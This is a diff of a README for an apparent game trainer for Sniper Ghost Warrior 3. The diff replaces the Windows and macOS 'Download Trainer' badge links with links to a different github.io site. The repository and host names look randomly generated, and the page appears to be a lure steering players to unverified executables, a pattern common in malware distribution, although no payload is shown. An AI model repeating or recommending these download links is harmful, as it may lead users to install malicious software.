@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/vwnushxdzylf/sniper-ghost-warrior-3-trainer)
 
-[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
 
 ![Sniper Ghost Warrior 3](game.jpg)
 
@@ -77,7 +77,7 @@ The **Sniper Ghost Warrior 3 Trainer** solves all these issues by giving you com
 
 macOS users can use our alternative tool:
 
-[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://bansheeloaderquay.github.io/dl-mac/)
+[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
 
 ## ⚖️ Legal
 
